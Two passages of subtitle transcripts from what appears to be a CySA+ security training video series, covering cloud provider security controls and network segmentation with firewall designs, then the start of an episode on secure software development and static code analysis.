00:16:13.601\nWhat's the security on your end?\n\n321\n00:16:13.601 --> 00:16:15.748\nKind of already talked about this\nin the previous episode, but\n\n322\n00:16:15.748 --> 00:16:17.215\nit's always good to rehash these things.\n\n323\n00:16:17.215 --> 00:16:21.914\nAnd to be always thinking,\nthat could be something\n\n324\n00:16:21.914 --> 00:16:26.370\nthat's not being done on a regular basis.\n\n325\n00:16:26.370 --> 00:16:28.850\nThat's a real easy way for\nan attacker to get in.\n\n326\n00:16:28.850 --> 00:16:31.060\nSo we wanna verify that kind of stuff.\n\n327\n00:16:32.140 --> 00:16:35.938\nLet's see here, what are some\nof the security controls that\n\n328\n00:16:35.938 --> 00:16:40.337\ncan be afforded by you, as the cloud\nprovider, to me, as the client?\n\n329\n00:16:40.337 --> 00:16:44.729\nI think of AWS, if I were to log in to\nAWS right now, when you spin up an EC2\n\n330\n00:16:44.729 --> 00:16:48.921\ninstance, you're able to create\nwhat's called a security group.\n\n331\n00:16:48.921 --> 00:16:51.339\nA security group is, it's a weird thing,\n\n332\n00:16:51.339 --> 00:16:56.390\nit's actually kind of like a firewall\nslash, or an ACL, I guess, more properly.\n\n333\n00:16:56.390 --> 00:16:57.200\nWhat's allowed in and\n\n334\n00:16:57.200 --> 00:17:01.970\nwhat's allowed out, what kind of traffic,\nand from where, okay?\n\n335\n00:17:01.970 --> 00:17:07.600\nThat's something that Amazon affords to me\nas the client to give me some security.\n\n336\n00:17:07.600 --> 00:17:11.370\nSo if I am outsourcing some security.\n\n337\n00:17:11.370 --> 00:17:13.960\nOf if I'm outsourcing a service,\n\n338\n00:17:13.960 --> 00:17:18.940\nwhat kinda security controls are in place\nthat I can use to secure things up?\n\n339\n00:17:18.940 --> 00:17:21.400\nAm I allowed to do a penetration test?\n\n340\n00:17:21.400 --> 00:17:25.789\nI don't know, a lot of times you have to\nget permission, because it's not my stuff.\n\n341\n00:17:25.789 --> 00:17:31.285\nMy stuff is on your stuff, but\nwhere’s the line of demarcation\n\n342\n00:17:31.285 --> 00:17:36.585\nto where my rights end and\nyour rights as the provider begin?\n\n343\n00:17:36.585 --> 00:17:38.740\nAnd how do we work together to\nkeep it a secure environment?\n\n344\n00:17:38.740 --> 00:17:41.860\nThat’s the kind of idea that\nyou’ve gotta keep going on.\n\n345\n00:17:41.860 --> 00:17:46.755\nAnd remember, you can directly connect a\nremote network into your on-prem systems.\n\n346\n00:17:46.755 --> 00:17:48.665\nNow, Wes, I know you've been\nlooking at this quite a bit.\n\n347\n00:17:48.665 --> 00:17:51.809\nHe's been working on Azure quite a bit,\nanother cloud service.\n\n348\n00:17:51.809 --> 00:17:53.030\n&gt;&gt; The Azure Service Bus.\n\n349\n00:17:53.030 --> 00:17:56.991\nYeah, the Azure Service Bus allows you\nto go directly from on-prem a direct,\n\n350\n00:17:56.991 --> 00:18:00.790\nexpensive, direct connection\nright back into Azure's database.\n\n351\n00:18:00.790 --> 00:18:04.450\n&gt;&gt; Exactly, you can make those direct\nconnections into your systems.\n\n352\n00:18:04.450 --> 00:18:05.940\nHow is that secured?\n\n353\n00:18:05.940 --> 00:18:10.010\nOr is the data just, hey, we're pumping it\nacross the Internet, good luck with that.\n\n354\n00:18:10.010 --> 00:18:12.380\nProbably not, all right,\nthere is probably some secure mechanisms.\n\n355\n00:18:12.380 --> 00:18:17.130\nBut don't rest on the fact that\nprobably it's there, know for a fact.\n\n356\n00:18:17.130 --> 00:18:18.050\nRemember, if you get audited,\n\n357\n00:18:18.050 --> 00:18:20.850\nthe auditor's gonna want\nyou to prove it to them.\n\n358\n00:18:20.850 --> 00:18:24.912\nAs Missouri would say, show me,\nshow me don't tell me.\n\n359\n00:18:24.912 --> 00:18:27.280\nI wanna see it, I wanna see\nthe controls that are in place.\n\n360\n00:18:27.280 --> 00:18:28.980\nI wanna make sure that they are working.\n\n361\n00:18:28.980 --> 00:18:33.160\nYou should have that mindset any\ntime you bring in anything new, and\n\n362\n00:18:33.160 --> 00:18:35.540\nwhen you are designing\na system from the out.\n\n363\n00:18:35.540 --> 00:18:38.920\nSo if you're designing\na network from the outset,\n\n364\n00:18:38.920 --> 00:18:42.560\nand you say we're going to employ\nsome form of cloud service.\n\n365\n00:18:42.560 --> 00:18:44.270\nWell how's that gonna connect\nto our on-prem service?\n\n366\n00:18:44.270 --> 00:18:45.310\nDo we have an on-prem service?\n\n367\n00:18:45.310 --> 00:18:46.070\nIs it all in the cloud?\n\n368\n00:18:47.080 --> 00:18:51.960\nIdeas and thoughts that you have to be\nprocessing as you design that network out.\n\n369\n00:18:51.960 --> 00:18:55.731\nSo if you are using this as IS,\nright, the infrastructure of service.\n\n370\n00:18:55.731 --> 00:18:59.345\nIf I am bringing in some\ninfrastructure from a cloud service,\n\n371\n00:18:59.345 --> 00:19:01.090\nhow is that being connected?\n\n372\n00:19:01.090 --> 00:19:04.510\nIs there any kind of failover?\n\n373\n00:19:04.510 --> 00:19:07.892\nIf I lose my main link to the Internet,\n\n374\n00:19:07.892 --> 00:19:13.300\nwhich gives me access to my cloud\nprovider, what do I do now?\n\n375\n00:19:13.300 --> 00:19:15.566\nAm I done, is it over?\n\n376\n00:19:15.566 --> 00:19:16.948\nOr do I have a failover link?\n\n377\n00:19:16.948 --> 00:19:21.641\nSo start looking for single points of\nfailure, and provide redundancy for\n\n378\n00:19:21.641 --> 00:19:25.227\nthem, so that it's no longer\na single point of failure.\n\n379\n00:19:25.227 --> 00:19:28.918\nYou can survive an outage,\nat least to some extent, right?\n\n380\n00:19:28.918 --> 00:19:31.430\nAnd of course,\nif you have the money, go crazy.\n\n381\n00:19:31.430 --> 00:19:34.918\nAnd then, the links that are there,\nare they being secured?\n\n382\n00:19:34.918 --> 00:19:42.980\nIs it a VPN, site-to-site capabilities of\ntunneling using IPSec, or SSL, or, yeah.\n\n383\n00:19:42.980 --> 00:19:45.062\nIs that happening, SSL, VPN tunnel?\n\n384\n00:19:45.062 --> 00:19:48.267\nOr TLS, I guess it would be nowadays,\nit should be TLS.\n\n385\n00:19:48.267 --> 00:19:51.810\n[LAUGH] Don't use SSL anymore,\nit's not good, right?\n\n386\n00:19:51.810 --> 00:19:55.200\nBut just verify that those things\nare happening, so it is very important.\n\n387\n00:19:55.200 --> 00:19:57.400\n&gt;&gt; Well how about another concept,\nif it's network design,\n\n388\n00:19:57.400 --> 00:20:00.360\nthen one of the things I think of\nis things like segmentation, right?\n\n389\n00:20:00.360 --> 00:20:04.060\nThe separation of certain devices,\ncomponents, resources within our network.\n\n390\n00:20:04.060 --> 00:20:05.732\nTell me a little bit about\nnetwork segmentation.\n\n391\n00:20:05.732 --> 00:20:08.918\n&gt;&gt; Yeah it's,\nhey have we not heard that already.\n\n392\n00:20:08.918 --> 00:20:10.078\nWes is right on the ball,\n\n393\n00:20:10.078 --> 00:20:12.800\nhe is a man that has been around\nthe block a couple of times.\n\n394\n00:20:12.800 --> 00:20:15.465\nNetwork segmentation\nis a very good way for\n\n395\n00:20:15.465 --> 00:20:19.760\nus to be able to control the security\nsurrounding our networks.\n\n396\n00:20:19.760 --> 00:20:22.730\nWhat gets in, what gets out,\nwho contacts who.\n\n397\n00:20:22.730 --> 00:20:27.260\nAnd should they be able to, and if so, we\nshould be monitoring that contact, right?\n\n398\n00:20:27.260 --> 00:20:28.480\nThe ideas go on and on.\n\n399\n00:20:28.480 --> 00:20:31.114\nSo what are the devices that\nhelp us do this segmentation,\n\n400\n00:20:31.114 --> 00:20:33.768\nwe've kinda been through this\na couple of times already.\n\n401\n00:20:33.768 --> 00:20:36.521\nThis is our routers, this is our switches,\nthis is our firewalls.\n\n402\n00:20:36.521 --> 00:20:40.680\nThese are the main devices in which\nwe use to control said segmentation.\n\n403\n00:20:40.680 --> 00:20:41.900\nEvery now and then you see a hub but,\n\n404\n00:20:42.900 --> 00:20:44.960\nlet's take those out of\nyour network right now.\n\n405\n00:20:44.960 --> 00:20:47.200\nI demand it unless you're using it for\n\n406\n00:20:47.200 --> 00:20:50.074\nlike sniffing the network\nas an administrator.\n\n407\n00:20:50.074 --> 00:20:54.163\nI don't really see any good reason\na hub should be on your device.\n\n408\n00:20:54.163 --> 00:20:57.729\nSo let's talk about switches, remember\nwe can create VLANs for segmentation.\n\n409\n00:20:57.729 --> 00:21:02.311\nSo now HR traffic is on the HR VLAN, and\nsales traffic is on the sales VLAN, and\n\n410\n00:21:02.311 --> 00:21:04.018\nnever the twain shall meet.\n\n411\n00:21:04.018 --> 00:21:07.944\nUnless we stick a router in the mix and\nallow for those connections.\n\n412\n00:21:07.944 --> 00:21:12.079\nAnd then if I do have a router, now I'm\nable to ACL that traffic and control that.\n\n413\n00:21:12.079 --> 00:21:15.133\nNow if I have multilayer switch,\nit does have ACL,\n\n414\n00:21:15.133 --> 00:21:17.271\nsome of them do have ACLing as well.\n\n415\n00:21:17.271 --> 00:21:21.280\nSo maybe I get an all in one solution\nwhen it comes to segregating\n\n416\n00:21:21.280 --> 00:21:24.540\nmy traffic between VLANs and\ncreating VLANs.\n\n417\n00:21:24.540 --> 00:21:29.400\nAnd then allowing for access control\nlists inside of that environment.\n\n418\n00:21:29.400 --> 00:21:34.690\nBut typically you'll see switches, and\nrouters, and multilayer switches as well.\n\n419\n00:21:34.690 --> 00:21:36.674\nFirewalls, don't forget\nto those those in there.\n\n420\n00:21:36.674 --> 00:21:38.821\nThere's a couple of ways in\nwhich we can employ firewalls.\n\n421\n00:21:38.821 --> 00:21:44.400\nThis is single firewalls, you've got\nmulti-homed firewalls basically,\n\n422\n00:21:44.400 --> 00:21:48.103\nor as they call it,\nmulti-interface firewalls.\n\n423\n00:21:48.103 --> 00:21:51.136\nAnd then you have multi-firewalls,\nand I've got a couple of\n\n424\n00:21:51.136 --> 00:21:54.771\ndiagrams that I've whipped up just so\nwe could see how these things work.\n\n425\n00:21:54.771 --> 00:21:58.893\nSo let's see here,\nI think this is my first one, here we go.\n\n426\n00:21:58.893 --> 00:22:02.345\nThis is network segmentation\nwith single firewall,\n\n427\n00:22:02.345 --> 00:22:04.573\nthis is a single firewall design.\n\n428\n00:22:04.573 --> 00:22:09.790\nWe've got the Internet here, and\ntraffic comes in and hits my router.\n\n429\n00:22:09.790 --> 00:22:14.140\nAnd the router, we'll have\nan interface that goes over to my DMZ.\n\n430\n00:22:14.140 --> 00:22:18.440\nMy DMZ is gonna be running things like\nemail, web, stuff of that nature.\n\n431\n00:22:18.440 --> 00:22:22.270\nStuff that I expect my outside world or\n\n432\n00:22:22.270 --> 00:22:25.580\noutside clients to be able to\naccess from the outside world.\n\n433\n00:22:25.580 --> 00:22:29.960\nIt's not a trusted network per se.\n\n434\n00:22:29.960 --> 00:22:34.266\nIt's on the inside a bit, but\nI expect it to be being contacted and\n\n435\n00:22:34.266 --> 00:22:38.120\nreached out to and\nhave communications with the outside.\n\n436\n00:22:38.120 --> 00:22:41.602\nNow I can put some ACL's in there to help\nwith that, but typically we got a router,\n\n437\n00:22:41.602 --> 00:22:43.387\nwe got our switch, and there's our DMZ.\n\n438\n00:22:43.387 --> 00:22:47.569\nAnd maybe I'm separating that traffic in\nthe DMZ through segmentation there, or\n\n439\n00:22:47.569 --> 00:22:48.547\ndifferent VLANs.\n\n440\n00:22:48.547 --> 00:22:53.415\nBut once, say I've got a web server\nsitting right here, and inside my internal\n\n441\n00:22:53.415 --> 00:22:57.790\nnetwork I've got a database backend,\nwhich is a very typical design.\n\n442\n00:22:59.360 --> 00:23:03.690\nYou'll notice that in between that\nconversation is going to be a firewall.\n\n443\n00:23:03.690 --> 00:23:06.377\nAnd it's going to be doing IDSing and\nIPSing, right?\n\n444\n00:23:06.377 --> 00:23:10.843\nAnd it's gonna be deep\npacket inspection happening.\n\n445\n00:23:10.843 --> 00:23:15.206\nI'm looking at this so that at least\nthe traffic is run through a security\n\n446\n00:23:15.206 --> 00:23:19.869\nappliance before it hits the backend\ninside of my trusted internal network.\n\n447\n00:23:19.869 --> 00:23:22.792\nSo that's a single firewall design,\njust in and out, and\n\n448\n00:23:22.792 --> 00:23:26.290\nit's checking the traffic\nas it passes through.\n\n449\n00:23:26.290 --> 00:23:31.220\nAll right let's get out of here,\nand let's move on to I think this\n\n450\n00:23:31.220 --> 00:23:35.830\nis the next one hopefully,\nI do this right.\n\n451\n00:23:35.830 --> 00:23:40.130\nNow we have a multi-homed or\nmulti-interface firewall.\n\n452\n00:23:40.130 --> 00:23:45.324\nNow you'll notice that the design\nreally hasn't changed a bunch, right?\n\n453\n00:23:45.324 --> 00:23:48.060\nI do also want you to know that this is,\n\n454\n00:23:48.060 --> 00:23:53.551\nthey'll call this a service leg firewall,\nthat's one of the names for it.\n\n455\n00:23:53.551 --> 00:23:58.111\nSo this will be the service leg\nright over here with the DMZ off of\n\n456\n00:23:58.111 --> 00:23:59.674\nanother interface.\n\n457\n00:23:59.674 --> 00:24:02.006\nSo we come straight in from\nthe Internet to the router.\n\n458\n00:24:02.006 --> 00:24:03.835\nThe router passes right to the firewall,\nand\n\n459\n00:24:03.835 --> 00:24:06.351\nthen the firewalls makes the rules\non where the traffic goes.\n\n460\n00:24:06.351 --> 00:24:09.182\nThis goes to the DMZ,\nAnd I'm inspecting it.\n\n461\n00:24:09.182 --> 00:24:12.962\nNow, my DMZ is getting inspected traffic,\nright?\n\n462\n00:24:12.962 --> 00:24:16.500\nNow when the traffic comes back and wants\naccess my internal network, guess what?\n\n463\n00:24:16.500 --> 00:24:20.800\nI'm inspecting that, I'm inspecting\nit coming in and going out, all ways.\n\n464\n00:24:20.800 --> 00:24:24.940\nNow this is a very common design because,\nwell you got one appliance,\n\n465\n00:24:24.940 --> 00:24:28.580\nand you just spend the money, get a beefy\nappliance and let it handle all this.\n\n466\n00:24:28.580 --> 00:24:34.260\nPut it in your modules, and\nlet it go buck wild, that's great, right?\n\n467\n00:24:34.260 --> 00:24:37.150\nThat's a really good way to\nhandle this cuz it's one.\n\n468\n00:24:37.150 --> 00:24:39.970\nBut then you gotta worry about\nsingle point of failure,\n\n469\n00:24:39.970 --> 00:24:41.420\nwhat if that firewall goes down?\n\n470\n00:24:41.420 --> 00:24:42.510\nDo I have on site backup?\n\n471\n00:24:42.510 --> 00:24:45.460\nThese are all the things that\nwe have to take into accounts.\n\n472\n00:24:45.460 --> 00:24:50.060\nBut it's a really good basic design for\nmaybe smaller companies.\n\n473\n00:24:50.060 --> 00:24:55.360\nAll right, so let's take a look at the,\nthat's the service legs design or\n\n474\n00:24:55.360 --> 00:24:58.290\nthe multi interface firewall.\n\n475\n00:24:58.290 --> 00:25:01.990\nLet's take a look at the last\ndesign which is the multi firewall,\n\n476\n00:25:01.990 --> 00:25:06.850\nagain getting a little more complex\nbecause we're adding appliances in here,\n\n477\n00:25:06.850 --> 00:25:08.430\nand giving us a little more security.\n\n478\n00:25:08.430 --> 00:25:14.200\nBut really if you look at this, this\nis basically the same design as before,\n\n479\n00:25:14.200 --> 00:25:15.960\nyou just have different\nappliances doing it.\n\n480\n00:25:15.960 --> 00:25:20.770\nSo you might be able to be a little more\nrobust as far as its capabilities goes,\n\n481\n00:25:20.770 --> 00:25:22.440\nyou're not getting such a performance hit.\n\n482\n00:25:22.440 --> 00:25:24.790\nIt just depends on the devices\nthat you're using.\n\n483\n00:25:24.790 --> 00:25:28.447\nBut it's basically the same idea,\ninternet comes in to the router,\n\n484\n00:25:28.447 --> 00:25:32.561\nrouter shoots it over to the firewall,\nfirewall sends it down to the switch.\n\n485\n00:25:32.561 --> 00:25:37.331\nAnd then that traffic either gets over to\nthe DMZ, or into the internal network,\n\n486\n00:25:37.331 --> 00:25:40.590\ndepending on where it's designed to go.\n\n487\n00:25:40.590 --> 00:25:45.370\nAnd if you're going into the internal\nnetwork, you hit yet another firewall.\n\n488\n00:25:45.370 --> 00:25:49.550\nSo, it's all about laying out\nthe traffic in a way that it's going to\n\n489\n00:25:49.550 --> 00:25:53.980\nat least be inspected and checked in some\nway, shape or form through your firewall.\n\n490\n00:25:53.980 --> 00:25:57.760\nAllowing those firewall rules to\napply to it and just because you got\n\n491\n00:25:57.760 --> 00:26:00.760\na DMZ over there, doesn't mean you\nshouldn't be inspecting that traffic.\n\n492\n00:26:00.760 --> 00:26:04.750\nIt could definitely be a precursor\nto a further attack down the road,\n\n493\n00:26:04.750 --> 00:26:07.490\nso it's nice to be able to\nsee what's happening there.\n\n494\n00:26:07.490 --> 00:26:10.600\nIf you've got your own firewall\ndedicated for seeing that\n\n495\n00:26:10.600 --> 00:26:15.030\nincoming traffic that is going over there,\nthen that can be a very helpful thing.\n\n496\n00:26:15.030 --> 00:26:18.030\nSo that being said, these are the\ndifferent types of network segmentation\n\n497\n00:26:18.030 --> 00:26:19.730\nthat you're gonna need to know for\nthe exam.\n\n498\n00:26:19.730 --> 00:26:23.850\nAnd, that about wraps it up for\nthis show my man.\n\n499\n00:26:23.850 --> 00:26:26.340\n&gt;&gt; All right,\nI'm glad I had got to jump in on this one,\n\n500\n00:26:26.340 --> 00:26:28.630\nbeen some fascinating, exciting concepts.\n\n501\n00:26:28.630 --> 00:26:32.470\nI know Dan you love this stuff, you know I\nlove this stuff, so we'll do exactly that.\n\n502\n00:26:32.470 --> 00:26:34.640\nWe're gonna round this one out,\nand we'll call it a day, but\n\n503\n00:26:34.640 --> 00:26:37.120\nkeep in mind we've got a lot\nmore to come in this CySA+.\n\n504\n00:26:37.120 --> 00:26:39.100\nDan as always we

00:00:24.344\nI know you wanna find out more.\n\n11\n00:00:24.344 --> 00:00:27.830\nAnd Daniel Lowrie's here to tell you\nall about it, aren't you Daniel?\n\n12\n00:00:27.830 --> 00:00:30.525\n&gt;&gt; Well, I'm gonna do my level best,\nthat's for sure.\n\n13\n00:00:30.525 --> 00:00:31.944\nZach, I'm glad to be on the show today.\n\n14\n00:00:31.944 --> 00:00:35.210\nAnd we are gonna be talking about\nsoftware development security.\n\n15\n00:00:35.210 --> 00:00:38.852\nBasically, there's the SDLC,\nand that's all great and good.\n\n16\n00:00:38.852 --> 00:00:39.778\nYou do need to know that.\n\n17\n00:00:39.778 --> 00:00:43.944\nBut what kind of security measures do\nwe need to be kinda implementing and\n\n18\n00:00:43.944 --> 00:00:45.460\nwhat does that look like?\n\n19\n00:00:45.460 --> 00:00:48.870\nAnd that's what we're gonna try\nto cover in today's episode.\n\n20\n00:00:48.870 --> 00:00:49.380\n&gt;&gt; Very good.\n\n21\n00:00:49.380 --> 00:00:51.410\nSo does firewalls involved with this or\nno?\n\n22\n00:00:51.410 --> 00:00:51.910\n&gt;&gt; Firewalls?\n\n23\n00:00:51.910 --> 00:00:52.900\nNot neccesarilly, no.\n\n24\n00:00:52.900 --> 00:00:56.140\nThis is more of the let's\ncreate a program.\n\n25\n00:00:56.140 --> 00:00:58.099\nLet's actually write code, right?\n\n26\n00:00:58.099 --> 00:00:59.420\n&gt;&gt; Okay, very good.\n\n27\n00:00:59.420 --> 00:01:01.430\n&gt;&gt; We're gonna write code.\n\n28\n00:01:01.430 --> 00:01:05.690\nAre there insecure ways and\nmore secure ways to write said code?\n\n29\n00:01:05.690 --> 00:01:08.490\nAre there things that\nlead to vulnerabilities?\n\n30\n00:01:08.490 --> 00:01:09.130\nWell, yes, there are.\n\n31\n00:01:09.130 --> 00:01:10.698\nWell, how do I avoid that?\n\n32\n00:01:10.698 --> 00:01:14.770\nWell, there are some secure program best\npractices and things of that nature, and\n\n33\n00:01:14.770 --> 00:01:17.680\ndifferent types of reviews of\nthe code that we can engage in\n\n34\n00:01:17.680 --> 00:01:21.720\nto make sure that we're not falling\nin the trap of insecurity, or\n\n35\n00:01:21.720 --> 00:01:24.540\nat least to attempt to keep us\nfrom falling into that trap.\n\n36\n00:01:24.540 --> 00:01:27.000\nWe still fall into it,\ncuz we're people and\n\n37\n00:01:27.000 --> 00:01:27.634\nthat's-\n&gt;&gt; [CROSSTALK] So\n\n38\n00:01:27.634 --> 00:01:29.097\nwe're talking about software pacifiers.\n\n39\n00:01:29.097 --> 00:01:29.784\n&gt;&gt; Yes!\n\n40\n00:01:29.784 --> 00:01:31.568\n&gt;&gt; [LAUGH]\n&gt;&gt; Software pacifiers, I like that.\n\n41\n00:01:31.568 --> 00:01:32.360\n&gt;&gt; [LAUGH]\n&gt;&gt; I like that.\n\n42\n00:01:32.360 --> 00:01:34.330\nWe're gonna use that,\nyeah, software pacifiers.\n\n43\n00:01:34.330 --> 00:01:37.990\nWe're gonna help us not do dumb things.\n\n44\n00:01:37.990 --> 00:01:40.650\n&gt;&gt; That's good.\n&gt;&gt; That lead to vulnerabilities,\n\n45\n00:01:40.650 --> 00:01:44.260\nwhich then lead to exploitation, which\nleads to data breaches, which is bad.\n\n46\n00:01:44.260 --> 00:01:44.770\nAll bad.\n\n47\n00:01:44.770 --> 00:01:46.262\nThat's what we're talking about today.\n\n48\n00:01:46.262 --> 00:01:50.820\nWe're gonna start off with the security\nrequirements and definitions.\n\n49\n00:01:50.820 --> 00:01:56.800\nSo in each one of your environments,\nand you're creating applications,\n\n50\n00:01:56.800 --> 00:01:59.650\nyou're working on applications that maybe\nalready existed, you're creating new ones,\n\n51\n00:01:59.650 --> 00:02:01.380\nyou're revising old ones, doesn't matter.\n\n52\n00:02:01.380 --> 00:02:05.670\nWhatever it is you're doing,\nyou have specific security requirements.\n\n53\n00:02:05.670 --> 00:02:09.660\nWhat do I need to be paying attention\nto when it comes to security\n\n54\n00:02:09.660 --> 00:02:13.720\nbased off of the environment that\nI'm working in, if that makes sense?\n\n55\n00:02:13.720 --> 00:02:17.568\nNow of course,\nthat's going to differ very wildly and\n\n56\n00:02:17.568 --> 00:02:20.925\nwidely based on the enviroment\nthat you are in.\n\n57\n00:02:20.925 --> 00:02:22.960\nSo it's kinda hard to pin that down.\n\n58\n00:02:22.960 --> 00:02:28.208\nBut just a basic idea is that you need\nto be able to come up with what type\n\n59\n00:02:28.208 --> 00:02:33.910\nof security requirements that you have or\nthat you need to have since you can\n\n60\n00:02:33.910 --> 00:02:39.636\nput them in place as you start coding and\nworking toward an actual product.\n\n61\n00:02:39.636 --> 00:02:42.697\n&gt;&gt; So security testing phases,\nis that what we're leading up to?\n\n62\n00:02:42.697 --> 00:02:46.325\n&gt;&gt; Yes, yeah, so now that we understand\nthat we need to create a definition of\n\n63\n00:02:46.325 --> 00:02:49.400\nthe requirements we need,\nnow we could start testing, okay?\n\n64\n00:02:49.400 --> 00:02:51.200\nAnd there are different testing phases.\n\n65\n00:02:51.200 --> 00:02:55.500\nThey include static code analysis,\nweb app vulnerability, scanning,\n\n66\n00:02:55.500 --> 00:03:01.530\nusing interception proxies to quell\nthese things, and fuzzing as well.\n\n67\n00:03:01.530 --> 00:03:04.190\nWe're gonna talk about all\nof those in more detail.\n\n68\n00:03:04.190 --> 00:03:07.680\nLet's start off with that\nstatic code analysis.\n\n69\n00:03:07.680 --> 00:03:09.392\nSo what is static analysis?\n\n70\n00:03:09.392 --> 00:03:11.793\nZach, tell these people.\n\n71\n00:03:11.793 --> 00:03:14.880\n&gt;&gt; Well you have to\nanalyze the static code.\n\n72\n00:03:14.880 --> 00:03:15.590\n&gt;&gt; That's right.\n\n73\n00:03:15.590 --> 00:03:17.088\nSee, he gets it.\n\n74\n00:03:17.088 --> 00:03:17.878\nZach's on the money, bing!\n\n75\n00:03:17.878 --> 00:03:22.790\nIt's actually not incorrect even\nthough he used the definition.\n\n76\n00:03:22.790 --> 00:03:24.251\n&gt;&gt; Very broad.\n\n77\n00:03:24.251 --> 00:03:25.642\n&gt;&gt; Let's boil that down a little more.\n\n78\n00:03:25.642 --> 00:03:31.760\nSo static code is the code that you\nhave created in your application.\n\n79\n00:03:31.760 --> 00:03:32.977\nAnd guess what you're gonna do?\n\n80\n00:03:32.977 --> 00:03:35.738\nYou're gonna look at it and\nyou're gonna look for issues.\n\n81\n00:03:35.738 --> 00:03:41.010\nYou're gonna look for\nthings that would cause a problem, okay?\n\n82\n00:03:41.010 --> 00:03:43.589\nSo I'm not a coder, per se.\n\n83\n00:03:43.589 --> 00:03:45.352\nI do a little bit here and there.\n\n84\n00:03:45.352 --> 00:03:47.698\nBut I can make things\nwork that I need to work.\n\n85\n00:03:47.698 --> 00:03:51.900\nOr if I have to compile and exploit and\nmodify it to fit my environment,\n\n86\n00:03:51.900 --> 00:03:53.050\nthat kinda stuff.\n\n87\n00:03:53.050 --> 00:03:54.230\nThat's the stuff I can do.\n\n88\n00:03:54.230 --> 00:03:59.360\nBut as a developer, as someone that\ndoes developments, you will know,\n\n89\n00:03:59.360 --> 00:04:03.520\nokay, and if you don't, we're gonna\ngo over some of those things today.\n\n90\n00:04:03.520 --> 00:04:07.830\nMaybe I've hard-coded some\ncredentials into our product.\n\n91\n00:04:09.310 --> 00:04:11.299\nProbably not a good idea.\n\n92\n00:04:11.299 --> 00:04:13.611\nBecause we've talked about\nthings like reverse engineering.\n\n93\n00:04:13.611 --> 00:04:18.801\nAnd reverse engineering will\nprobably reveal said credentials and\n\n94\n00:04:18.801 --> 00:04:24.480\ngive a bad actor access intto the system\nthat you don't want them to have.\n\n95\n00:04:24.480 --> 00:04:26.476\nSo these are the kind of\nthings that we wanna look for.\n\n96\n00:04:26.476 --> 00:04:29.780\nThrough static code analysis,\nwe sit down and we go, you know what?\n\n97\n00:04:29.780 --> 00:04:34.150\nLet's take a cold, hard look at\nwhat's going on with this thing and\n\n98\n00:04:34.150 --> 00:04:36.690\nsee if there's any issues\nmaybe I just overlooked.\n\n99\n00:04:36.690 --> 00:04:40.190\nLet me make sure I walk through the logic\nand make sure everything is on the up and\n\n100\n00:04:40.190 --> 00:04:43.790\nup, doing things that are fun and\nnot things that are not fun.\n\n101\n00:04:43.790 --> 00:04:46.090\nLike I said, again, we're gonna get\ninto those things in just a minute.\n\n102\n00:04:46.090 --> 00:04:49.210\nWe're gonna talk about\nthe different types of phases for\n\n103\n00:04:49.210 --> 00:04:52.210\nsecurity testing we need\nto go through first, right?\n\n104\n00:04:53.230 --> 00:04:55.410\nSo this is like white box testing.\n\n105\n00:04:55.410 --> 00:04:57.940\nI have the code in front of me.\n\n106\n00:04:57.940 --> 00:05:01.200\nThere it is in all its splendor.\n\n107\n00:05:01.200 --> 00:05:03.082\nI get to look, I've got that insider look.\n\n108\n00:05:03.082 --> 00:05:04.843\nAnd it might not be you alone.\n\n109\n00:05:04.843 --> 00:05:09.450\nIt might be a group of people, but\nthey all have access to that code.\n\n110\n00:05:09.450 --> 00:05:11.260\nThey can see into it.\n\n111\n00:05:11.260 --> 00:05:14.728\nThey can peer into the inner\nworkings of this thing and\n\n112\n00:05:14.728 --> 00:05:16.897\nfigure out maybe we shouldn't.\n\n113\n00:05:16.897 --> 00:05:19.254\nAre we sanitizing our input right here?\n\n114\n00:05:19.254 --> 00:05:20.690\nBecause we're taking input from the user.\n\n115\n00:05:20.690 --> 00:05:26.280\nI don't see any kind of safeguards\non that data that's coming back.\n\n116\n00:05:26.280 --> 00:05:27.470\nMaybe we need to rethink that.\n\n117\n00:05:27.470 --> 00:05:29.856\nSo that's what we're looking at.\n\n118\n00:05:29.856 --> 00:05:31.570\nWe got full code accessibility now.\n\n119\n00:05:31.570 --> 00:05:36.579\nNow there's a couple of ways that we can\ndo static code, testing our analysis.\n\n120\n00:05:36.579 --> 00:05:39.610\nAnd that is through automated means or\nmanual review.\n\n121\n00:05:39.610 --> 00:05:43.082\nWhat we've been talking about so\nfar is basically manual review, okay?\n\n122\n00:05:43.082 --> 00:05:47.343\nAnd we're gonna talk a bit more about\ntypes of manual code reviews in\n\n123\n00:05:47.343 --> 00:05:48.330\njust a minute.\n\n124\n00:05:48.330 --> 00:05:50.358\nBut right now,\nlet's jump into that automatic.\n\n125\n00:05:50.358 --> 00:05:51.030\nGuess what?\n\n126\n00:05:51.030 --> 00:05:55.860\nThere are tools just like\nvulnerability schemes.\n\n127\n00:05:55.860 --> 00:05:59.080\nThis is kinda the same thing,\nbut for your code.\n\n128\n00:05:59.080 --> 00:06:01.086\nIt's looking for known issues,\n\n129\n00:06:01.086 --> 00:06:05.684\nways in which people will typically set\nthings up that can lead to a problem.\n\n130\n00:06:05.684 --> 00:06:09.601\nI can code that in programatically\ninto a scanner and\n\n131\n00:06:09.601 --> 00:06:13.437\nhave it look through the code and\ngo, you did this.\n\n132\n00:06:13.437 --> 00:06:15.262\nAnd I tested it and guess what?\n\n133\n00:06:15.262 --> 00:06:18.050\nIt led to a SQL injection.\n\n134\n00:06:18.050 --> 00:06:19.134\nOkay, right?\n\n135\n00:06:19.134 --> 00:06:20.841\nSo I can fire up a scanner,\n\n136\n00:06:20.841 --> 00:06:25.860\nand there's a multitude of them\nactually out that you can purchase.\n\n137\n00:06:25.860 --> 00:06:27.540\nThere are some open source ones.\n\n138\n00:06:27.540 --> 00:06:30.005\nThey do tend to break down by language,\n\n139\n00:06:30.005 --> 00:06:33.590\nlike what language you're\nusing to program in.\n\n140\n00:06:33.590 --> 00:06:38.990\nSo if you're programming in C++,\nyou go get one that's meant for C and C++.\n\n141\n00:06:38.990 --> 00:06:43.090\nIf you're programming in Java, look for\none that's specializes in Java.\n\n142\n00:06:43.090 --> 00:06:47.213\nYou're doing PHP, Pearl whatever,\nyou get the idea, right?\n\n143\n00:06:47.213 --> 00:06:48.586\nI was so happy.\n\n144\n00:06:48.586 --> 00:06:51.860\nI was able to find one that was gonna\nbe great for our demonstrations.\n\n145\n00:06:51.860 --> 00:06:52.676\nLittle depreciated.\n\n146\n00:06:52.676 --> 00:06:56.600\nThey've gone to a new version of this.\n\n147\n00:06:56.600 --> 00:06:57.339\nI've checked out their site.\n\n148\n00:06:57.339 --> 00:06:59.203\nIt still looks really awesome.\n\n149\n00:06:59.203 --> 00:07:02.578\nBut I've got the older\nversion because it was 